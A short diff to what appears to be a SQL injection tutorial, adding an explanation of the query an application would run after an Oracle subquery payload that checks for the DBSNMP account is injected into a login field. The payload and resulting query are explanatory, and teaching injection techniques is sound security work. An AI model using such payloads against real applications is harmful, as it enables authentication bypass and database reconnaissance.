@@ -169,3 +169,7 @@ There are many circumstances in which you may be able to inject an arbitrary que
 In addition to modifying the query’s logic to bypass the login, you can inject an entirely separate subquery using string concatenation to join its results to the item you control. For example:
 
 ``` foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)--```
+
+This causes the application to perform the following query:
+
+```SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’```
